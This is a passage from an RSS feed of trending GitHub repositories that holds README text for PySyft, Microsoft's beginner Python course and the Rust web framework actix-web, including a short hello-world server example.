&lt;p&gt;We have written an installation example in &lt;a href="https://colab.research.google.com/drive/14tNU98OKPsP55Y3IgFtXPfd4frqbkrxK" rel="nofollow"&gt;this colab notebook&lt;/a&gt;, you can use it as is to start working with PySyft on the colab cloud, or use this setup to fix your installation locally.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-organizational-contributions" class="anchor" aria-hidden="true" href="#organizational-contributions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Organizational Contributions&lt;/h2&gt;
&lt;p&gt;We are very grateful for contributions to PySyft from the following organizations!&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;a href="https://udacity.com/" rel="nofollow"&gt;&lt;img src="https://github.com/udacity/private-ai/raw/master/udacity-logo-vert-white.png?raw=true" alt="Udacity" width="200" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/th&gt;
&lt;th&gt;&lt;a href="https://github.com/coMindOrg/federated-averaging-tutorials"&gt;&lt;img src="https://raw.githubusercontent.com/coMindOrg/federated-averaging-tutorials/master/images/comindorg_logo.png" alt="coMind" width="200" height="130" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/th&gt;
&lt;th&gt;&lt;a href="http://ark.hn" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/be92b38b67e07af1906d84f1820eac194a91da6e/68747470733a2f2f692e6962622e636f2f7659776347394e2f61726b686e2d6c6f676f2e706e67" alt="Arkhn" width="200" height="150" data-canonical-src="https://i.ibb.co/vYwcG9N/arkhn-logo.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/th&gt;
&lt;th&gt;&lt;a href="https://dropoutlabs.com/" rel="nofollow"&gt;&lt;img src="https://raw.githubusercontent.com/dropoutlabs/files/master/dropout-labs-logo-white-2500.png" alt="Dropout Labs" width="200" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-disclaimer" class="anchor" aria-hidden="true" href="#disclaimer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;Do NOT use this code to protect data (private or otherwise) - at present it is very insecure. Come back in a couple months.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/OpenMined/PySyft/blob/master/LICENSE"&gt;Apache License 2.0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://app.fossa.io/projects/git%2Bgithub.com%2Fmatthew-mcateer%2FPySyft?ref=badge_large" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ab5021d3cb5af9e9f1482ef8b26481bcc42ffef5/68747470733a2f2f6170702e666f7373612e696f2f6170692f70726f6a656374732f6769742532426769746875622e636f6d2532466d6174746865772d6d6361746565722532465079537966742e7376673f747970653d6c61726765" alt="FOSSA Status" data-canonical-src="https://app.fossa.io/api/projects/git%2Bgithub.com%2Fmatthew-mcateer%2FPySyft.svg?type=large" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>OpenMined</author><guid isPermaLink="false">https://github.com/OpenMined/PySyft</guid><pubDate>Sun, 19 Jan 2020 00:08:00 GMT</pubDate></item><item><title>microsoft/c9-python-getting-started #9 in All Languages, Today</title><link>https://github.com/microsoft/c9-python-getting-started</link><description>&lt;p&gt;&lt;i&gt;Sample code for Channel 9 Python for Beginners course&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-getting-started-with-python" class="anchor" aria-hidden="true" href="#getting-started-with-python"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting started with Python&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-overview" class="anchor" aria-hidden="true" href="#overview"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Overview&lt;/h2&gt;
&lt;p&gt;The series of videos on Channel 9 is designed to help get you up to speed on Python. If you're a beginning developer who's looking to add Python to your quiver of languages, or trying to get started on a data science or web project, these videos can help teach you the foundation necessary to walk through a quick start or other tutorial.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-what-youll-learn" class="anchor" aria-hidden="true" href="#what-youll-learn"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;What you'll learn&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The basics of Python&lt;/li&gt;
&lt;li&gt;Starting a project&lt;/li&gt;
&lt;li&gt;Common syntax&lt;/li&gt;
&lt;li&gt;Package management&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-what-we-dont-cover" class="anchor" aria-hidden="true" href="#what-we-dont-cover"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;What we don't cover&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Class design and inheritance&lt;/li&gt;
&lt;li&gt;Asynchronous programming&lt;/li&gt;
&lt;li&gt;Basics of programming&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-prerequisites" class="anchor" aria-hidden="true" href="#prerequisites"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Prerequisites&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/en/v1/Getting-Started" rel="nofollow"&gt;An understanding of Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Light experience with another programming language, such as &lt;a href="https://www.edx.org/course/javascript-introduction" rel="nofollow"&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-next-steps" class="anchor" aria-hidden="true" href="#next-steps"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Next steps&lt;/h2&gt;
&lt;p&gt;As the goal of this course is to help get you up to speed on Python so you can work through a quick start, the next step after completing the videos is to follow a tutorial! Here's a few of our favorites:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/azure/cognitive-services/face/QuickStarts/Python?WT.mc_id=python-c9-niner" rel="nofollow"&gt;Quickstart: Detect faces in an image using the Face REST API and Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/azure/cognitive-services/computer-vision/quickstarts/python-disk?WT.mc_id=python-c9-niner" rel="nofollow"&gt;Quickstart: Analyze a local image using the Computer Vision REST API and Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/azure/cognitive-services/Text-Analytics/quickstarts/python?WT.mc_id=python-c9-niner" rel="nofollow"&gt;Quickstart: Using the Python REST API to call the Text Analytics Cognitive Service&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/azure/cognitive-services/translator/tutorial-build-flask-app-translation-synthesis" rel="nofollow"&gt;Tutorial: Build a Flask app with Azure Cognitive Services&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/python/tutorial-flask?WT.mc_id=python-c9-niner" rel="nofollow"&gt;Flask tutorial in Visual Studio Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/python/tutorial-django?WT.mc_id=python-c9-niner" rel="nofollow"&gt;Django tutorial in Visual Studio Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit &lt;a href="https://cla.opensource.microsoft.com" rel="nofollow"&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt;
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/" rel="nofollow"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;.
For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/" rel="nofollow"&gt;Code of Conduct FAQ&lt;/a&gt; or
contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>microsoft</author><guid isPermaLink="false">https://github.com/microsoft/c9-python-getting-started</guid><pubDate>Sun, 19 Jan 2020 00:09:00 GMT</pubDate></item><item><title>fafhrd91/actix-web #10 in All Languages, Today</title><link>https://github.com/fafhrd91/actix-web</link><description>&lt;p&gt;&lt;i&gt;Actix web is a small, pragmatic, and extremely fast rust web framework.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;div align="center"&gt;
 &lt;p&gt;&lt;/p&gt;&lt;h1&gt;&lt;a id="user-content-actix-web" class="anchor" aria-hidden="true" href="#actix-web"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Actix web&lt;/h1&gt; &lt;p&gt;&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Actix web is a small, pragmatic, and extremely fast rust web framework&lt;/strong&gt; &lt;/p&gt;
  &lt;p&gt;
&lt;/p&gt;&lt;p&gt;&lt;a href="https://travis-ci.org/actix/actix-web" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/3f3c46f46867171fbf59bb294095716a1e9b9a48/68747470733a2f2f7472617669732d63692e6f72672f61637469782f61637469782d7765622e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/actix/actix-web.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://codecov.io/gh/actix/actix-web" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ec14e36a8991875f5fe1f3301fbc7a74114b6842/68747470733a2f2f636f6465636f762e696f2f67682f61637469782f61637469782d7765622f6272616e63682f6d61737465722f67726170682f62616467652e737667" alt="codecov" data-canonical-src="https://codecov.io/gh/actix/actix-web/branch/master/graph/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://crates.io/crates/actix-web" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/4a6b6c49c8bb1b846cdde44934494bfbcb7e0d6c/68747470733a2f2f6d6572697462616467652e6865726f6b756170702e636f6d2f61637469782d776562" alt="crates.io" data-canonical-src="https://meritbadge.herokuapp.com/actix-web" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://gitter.im/actix/actix?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c85e4f6137c56b8860fc7dfffba243d9fd4b93f6/68747470733a2f2f6261646765732e6769747465722e696d2f61637469782f61637469782e737667" alt="Join the chat at https://gitter.im/actix/actix" data-canonical-src="https://badges.gitter.im/actix/actix.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://docs.rs/actix-web" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/8a1b471f1513399dedc04c0fccc119fe0b4d8284/68747470733a2f2f646f63732e72732f61637469782d7765622f62616467652e737667" alt="Documentation" data-canonical-src="https://docs.rs/actix-web/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://crates.io/crates/actix-web" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/271c51b56b214cdd55d9956de23b6fa9366d6933/68747470733a2f2f696d672e736869656c64732e696f2f6372617465732f642f61637469782d7765622e737667" alt="Download" data-canonical-src="https://img.shields.io/crates/d/actix-web.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://blog.rust-lang.org/2019/11/07/Rust-1.39.0.html" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/69b8a08794af6b5c4294be3cb3142a7c3aa947db/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f72757374632d312e33392b2d6c69676874677261792e737667" alt="Version" data-canonical-src="https://img.shields.io/badge/rustc-1.39+-lightgray.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/cfec5a540b09990e0ae511461415fde6114d3509/68747470733a2f2f696d672e736869656c64732e696f2f6372617465732f6c2f61637469782d7765622e737667"&gt;&lt;img src="https://camo.githubusercontent.com/cfec5a540b09990e0ae511461415fde6114d3509/68747470733a2f2f696d672e736869656c64732e696f2f6372617465732f6c2f61637469782d7765622e737667" alt="License" data-canonical-src="https://img.shields.io/crates/l/actix-web.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;p&gt;&lt;/p&gt;
  &lt;h3&gt;&lt;a id="user-content-----website----------chat----------examples--" class="anchor" aria-hidden="true" href="#----website----------chat----------examples--"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;
    &lt;a href="https://actix.rs" rel="nofollow"&gt;Website&lt;/a&gt;
    &lt;span&gt; | &lt;/span&gt;
    &lt;a href="https://gitter.im/actix/actix" rel="nofollow"&gt;Chat&lt;/a&gt;
    &lt;span&gt; | &lt;/span&gt;
    &lt;a href="https://github.com/actix/examples"&gt;Examples&lt;/a&gt;
  &lt;/h3&gt;
&lt;/div&gt;
&lt;br&gt;
&lt;p&gt;Actix web is a simple, pragmatic and extremely fast web framework for Rust.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Supported &lt;em&gt;HTTP/1.x&lt;/em&gt; and &lt;em&gt;HTTP/2.0&lt;/em&gt; protocols&lt;/li&gt;
&lt;li&gt;Streaming and pipelining&lt;/li&gt;
&lt;li&gt;Keep-alive and slow requests handling&lt;/li&gt;
&lt;li&gt;Client/server &lt;a href="https://actix.rs/docs/websockets/" rel="nofollow"&gt;WebSockets&lt;/a&gt; support&lt;/li&gt;
&lt;li&gt;Transparent content compression/decompression (br, gzip, deflate)&lt;/li&gt;
&lt;li&gt;Configurable &lt;a href="https://actix.rs/docs/url-dispatch/" rel="nofollow"&gt;request routing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Multipart streams&lt;/li&gt;
&lt;li&gt;Static assets&lt;/li&gt;
&lt;li&gt;SSL support with OpenSSL or Rustls&lt;/li&gt;
&lt;li&gt;Middlewares (&lt;a href="https://actix.rs/docs/middleware/" rel="nofollow"&gt;Logger, Session, CORS, etc&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Includes an asynchronous &lt;a href="https://actix.rs/actix-web/actix_web/client/index.html" rel="nofollow"&gt;HTTP client&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Supports &lt;a href="https://github.com/actix/actix"&gt;Actix actor framework&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-example" class="anchor" aria-hidden="true" href="#example"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Example&lt;/h2&gt;
&lt;p&gt;Dependencies:&lt;/p&gt;
&lt;div class="highlight highlight-source-toml"&gt;&lt;pre&gt;[&lt;span class="pl-en"&gt;dependencies&lt;/span&gt;]
&lt;span class="pl-smi"&gt;actix-web&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-smi"&gt;actix-rt&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;1&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Code:&lt;/p&gt;
&lt;div class="highlight highlight-source-rust"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;use&lt;/span&gt; actix_web&lt;span class="pl-k"&gt;::&lt;/span&gt;{get, web, App, HttpServer, Responder};

#[get(&lt;span class="pl-s"&gt;"/{id}/{name}/index.html"&lt;/span&gt;)]
&lt;span class="pl-k"&gt;async&lt;/span&gt; &lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;index&lt;/span&gt;(info: web::&lt;span class="pl-k"&gt;Path&lt;/span&gt;&amp;lt;(&lt;span class="pl-k"&gt;u32&lt;/span&gt;, &lt;span class="pl-k"&gt;String&lt;/span&gt;)&amp;gt;) -&amp;gt; &lt;span class="pl-k"&gt;impl&lt;/span&gt; Responder {
    &lt;span class="pl-c1"&gt;format!&lt;/span&gt;(&lt;span class="pl-s"&gt;"Hello {}! id:{}"&lt;/span&gt;, info.&lt;span class="pl-c1"&gt;1&lt;/span&gt;, info.&lt;span class="pl-c1"&gt;0&lt;/span&gt;)
}

#[actix_rt::main]
&lt;span class="pl-k"&gt;async&lt;/span&gt; &lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() -&amp;gt; std::io::&lt;span class="pl-k"&gt;Result&lt;/span&gt;&amp;lt;()&amp;gt; {
    HttpServer&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-k"&gt;||&lt;/span&gt; App&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;().&lt;span class="pl-en"&gt;service&lt;/span&gt;(index))
        .&lt;span class="pl-en"&gt;bind&lt;/span&gt;(&lt;span class="pl-s"&gt;"127.0.0.1:8080"&lt;/span&gt;)?
        .&lt;span class="pl-en"&gt;run&lt;/span&gt;()
        .&lt;span class="pl-k"&gt;await&lt;/span&gt;
}&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-more-examples" class="anchor" aria-hidden="true" href="#more-examples"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;More examples&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/basics/"&gt;Basics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/state/"&gt;Stateful&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/multipart/"&gt;Multipart streams&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/websocket/"&gt;Simple websocket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/template_tera/"&gt;Tera&lt;/a&gt; /&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/template_askama/"&gt;Askama&lt;/a&gt; templates&lt;/li&gt;
